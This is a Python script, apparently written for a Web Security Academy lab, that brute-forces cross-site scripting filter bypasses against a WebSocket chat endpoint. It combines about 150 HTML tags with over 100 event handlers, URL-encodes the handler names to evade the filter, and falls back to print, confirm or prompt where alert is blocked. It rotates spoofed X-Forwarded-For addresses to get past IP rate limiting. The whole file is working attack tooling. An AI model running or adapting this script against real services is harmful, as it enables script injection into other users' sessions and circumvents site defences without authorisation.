#!/usr/bin/env python3
import asyncio
import websockets
import json
import time

# Configuration
TARGET_URL = "wss://0af9006504a70472809003cb002b0085.web-security-academy.net/chat"
SESSION_COOKIE = "DCLEtam3QSXcpbFtD0rqXUMHx8y2LtAg"
ORIGIN = "https://0af9006504a70472809003cb002b0085.web-security-academy.net"

# All HTML tags to test
TAGS = [
    "a", "a2", "abbr", "acronym", "address", "animate", "animatemotion", "animatetransform",
    "applet", "area", "article", "aside", "audio", "audio2", "b", "bdi", "bdo", "big",
    "blink", "blockquote", "body", "br", "button", "canvas", "caption", "center", "cite",
    "code", "col", "colgroup", "command", "content", "data", "datalist", "dd", "del",
    "details", "dfn", "dialog", "dir", "div", "dl", "dt", "element", "em", "embed",
    "fieldset", "figcaption", "figure", "font", "footer", "form", "frame", "frameset",
    "h1", "head", "header", "hgroup", "hr", "html", "i", "iframe", "iframe2", "image",
    "image2", "image3", "img", "img2", "input", "input2", "input3", "input4", "ins",
    "kbd", "keygen", "label", "legend", "li", "link", "listing", "main", "map", "mark",
    "marquee", "menu", "menuitem", "meta", "meter", "multicol", "nav", "nextid", "nobr",
    "noembed", "noframes", "noscript", "object", "ol", "optgroup", "option", "output",
    "p", "param", "picture", "plaintext", "pre", "progress", "q", "rb", "rp", "rt",
    "rtc", "ruby", "s", "samp", "script", "section", "select", "set", "shadow", "slot",
    "small", "source", "spacer", "span", "strike", "strong", "style", "sub", "summary",
    "sup", "svg", "table", "tbody", "td", "template", "textarea", "tfoot", "th", "thead",
    "time", "title", "tr", "track", "tt", "u", "ul", "var", "video", "video2", "wbr", "xmp"
]

# All event handlers to test
EVENTS = [
    "onafterprint", "onanimationend", "onanimationiteration", "onanimationstart",
    "onauxclick", "onbeforecopy", "onbeforecut", "onbeforeinput", "onbeforeprint",
    "onbeforetoggle", "onbeforeunload", "onbegin", "onblur", "oncancel", "oncanplay",
    "oncanplaythrough", "onchange", "onclick", "onclose", "oncommand",
    "oncontentvisibilityautostatechange", "oncontextmenu", "oncopy", "oncuechange",
    "oncut", "ondblclick", "ondrag", "ondragend", "ondragenter", "ondragleave",
    "ondragover", "ondragstart", "ondrop", "ondurationchange", "onend", "onended",
    "onerror", "onfocus", "onfocusin", "onfocusout", "onformdata", "onhashchange",
    "oninput", "oninvalid", "onkeydown", "onkeypress", "onkeyup", "onload",
    "onloadeddata", "onloadedmetadata", "onloadstart", "onmessage", "onmousedown",
    "onmouseenter", "onmouseleave", "onmousemove", "onmouseout", "onmouseover",
    "onmouseup", "onmousewheel", "onpagehide", "onpageshow", "onpaste", "onpause",
    "onplay", "onplaying", "onpointercancel", "onpointerdown", "onpointerenter",
    "onpointerleave", "onpointermove", "onpointerout", "onpointerover",
    "onpointerrawupdate", "onpointerup", "onpopstate", "onprogress", "onratechange",
    "onrepeat", "onreset", "onresize", "onscroll", "onscrollend", "onscrollsnapchange",
    "onscrollsnapchanging", "onsearch", "onsecuritypolicyviolation", "onseeked",
    "onseeking", "onselect", "onselectionchange", "onselectstart", "onshow", "onsubmit",
    "onsuspend", "ontimeupdate", "ontoggle", "ontouchcancel", "ontouchend", "ontouchmove",
    "ontouchstart", "ontransitionend", "onunload", "onvolumechange", "onwaiting",
    "onwebkitanimationend", "onwebkitanimationiteration", "onwebkitanimationstart",
    "onwebkittransitionend", "onwheel"
]

def url_encode_event(event):
    """URL encode specific characters in event handler to bypass filters"""
    # Try different encoding strategies
    encodings = []
    
    # Strategy 1: Encode just the 'e' in 'on[e]rror' pattern
    if len(event) > 2:
        encoded = event[:2] + '%65' + event[3:]
        encodings.append(encoded)
    
    # Strategy 2: Encode first letter after 'on'
    if len(event) > 2:
        encoded = event[:2] + f'%{ord(event[2]):02x}' + event[3:]
        encodings.append(encoded)
    
    # Strategy 3: Encode multiple characters
    if len(event) > 3:
        encoded = event[:2] + f'%{ord(event[2]):02x}%{ord(event[3]):02x}' + event[4:]
        encodings.append(encoded)
    
    return encodings

async def test_payload(websocket, payload, ip_suffix):
    """Test a single payload and return result"""
    try:
        message = json.dumps({"message": payload})
        await websocket.send(message)
        
        response = await asyncio.wait_for(websocket.recv(), timeout=1)
        
        if "error" in response:
            return False, json.loads(response).get("error", "Unknown error")
        else:
            return True, response[:100]
    except asyncio.TimeoutError:
        return False, "Timeout"
    except Exception as e:
        return False, str(e)[:50]

async def test_combinations():
    """Test all tag and event combinations with URL encoding"""
    successful_payloads = []
    ip_counter = 1
    
    print(f"Testing {len(TAGS)} tags × {len(EVENTS)} events = {len(TAGS) * len(EVENTS)} combinations")
    print("="*60)
    
    # Test in batches to avoid overwhelming the server
    batch_size = 10
    current_batch = []
    
    for tag in TAGS:
        for event in EVENTS:
            # Generate different encoding variations
            encoded_events = url_encode_event(event)
            
            for encoded_event in encoded_events:
                # Test with print(1) since alert is blocked
                payloads = [
                    f"<{tag} {encoded_event}=print(1)>",
                    f"<{tag} {encoded_event}=confirm(1)>",
                    f"<{tag} {encoded_event}=prompt(1)>",
                ]
                
                for payload in payloads:
                    current_batch.append((payload, ip_counter))
                    ip_counter += 1
                    
                    if len(current_batch) >= batch_size:
                        # Process batch
                        await process_batch(current_batch, successful_payloads)
                        current_batch = []
                        await asyncio.sleep(1)  # Rate limiting
    
    # Process remaining payloads
    if current_batch:
        await process_batch(current_batch, successful_payloads)
    
    # Print results
    print("\n" + "="*60)
    if successful_payloads:
        print(f"[+] SUCCESSFUL BYPASSES FOUND: {len(successful_payloads)}")
        print("\nWorking payloads:")
        for payload in successful_payloads[:20]:  # Show first 20
            print(f"  {payload}")
        
        if len(successful_payloads) > 20:
            print(f"\n  ... and {len(successful_payloads) - 20} more")
            
        # Save to file
        with open('successful_xss_payloads.txt', 'w') as f:
            for payload in successful_payloads:
                f.write(payload + '\n')
        print("\n[*] All successful payloads saved to: successful_xss_payloads.txt")
    else:
        print("[-] No successful bypasses found")

async def process_batch(batch, successful_list):
    """Process a batch of payloads"""
    for payload, ip_suffix in batch:
        headers = {
            'X-Forwarded-For': f'192.168.{ip_suffix // 256}.{ip_suffix % 256}',
            'Cookie': f'session={SESSION_COOKIE}',
            'Origin': ORIGIN,
        }
        
        try:
            async with websockets.connect(TARGET_URL, extra_headers=headers) as ws:
                success, result = await test_payload(ws, payload, ip_suffix)
                
                if success:
                    print(f"[+] SUCCESS: {payload}")
                    successful_list.append(payload)
                else:
                    # Only print errors for interesting cases
                    if "Event handler" not in result and "Alert" not in result:
                        print(f"[-] {payload[:50]}... - {result}")
                        
        except Exception as e:
            print(f"[!] Connection error: {str(e)[:30]}")
            await asyncio.sleep(2)  # Wait longer on connection errors

async def quick_test():
    """Quick test with most promising combinations"""
    print("Running quick test with most promising payloads...")
    print("="*60)
    
    # Most promising tags
    promising_tags = ["img", "svg", "body", "iframe", "input", "video", "audio", "object", "embed"]
    
    # Most promising events with encoding
    promising_events = [
        ("onerror", "on%65rror"),
        ("onload", "on%6coad"),
        ("onfocus", "on%66ocus"),
        ("onmouseover", "on%6douseover"),
        ("onclick", "on%63lick"),
    ]
    
    successful = []
    ip = 1
    
    for tag in promising_tags:
        for event_name, encoded_event in promising_events:
            payloads = [
                f"<{tag} {encoded_event}=print(1)>",
                f"<{tag} {encoded_event}=confirm(1)>",
                f"<{tag} {encoded_event}=prompt(1)>",
            ]
            
            for payload in payloads:
                headers = {
                    'X-Forwarded-For': f'10.0.0.{ip}',
                    'Cookie': f'session={SESSION_COOKIE}',
                    'Origin': ORIGIN,
                }
                ip += 1
                
                try:
                    async with websockets.connect(TARGET_URL, extra_headers=headers) as ws:
                        success, result = await test_payload(ws, payload, ip)
                        
                        if success:
                            print(f"[+] WORKS: {payload}")
                            successful.append(payload)
                        else:
                            print(f"[-] Blocked: {payload[:40]}... - {result[:30]}")
                            
                except Exception as e:
                    print(f"[!] Error: {e}")
                
                await asyncio.sleep(0.5)
    
    if successful:
        print(f"\n[+] Found {len(successful)} working payloads:")
        for p in successful:
            print(f"  {p}")

async def main():
    print("WebSocket XSS Comprehensive Testing")
    print("Target:", TARGET_URL)
    print("="*60)
    
    # First run quick test
    await quick_test()
    
    # Ask if user wants full test
    print("\n" + "="*60)
    print("Quick test complete. Run full comprehensive test? (This will take longer)")
    print("Press Ctrl+C to skip, or wait 5 seconds to continue...")
    
    try:
        await asyncio.sleep(5)
        print("\nStarting comprehensive test...")
        await test_combinations()
    except KeyboardInterrupt:
        print("\nSkipping comprehensive test.")

if __name__ == "__main__":
    asyncio.run(main())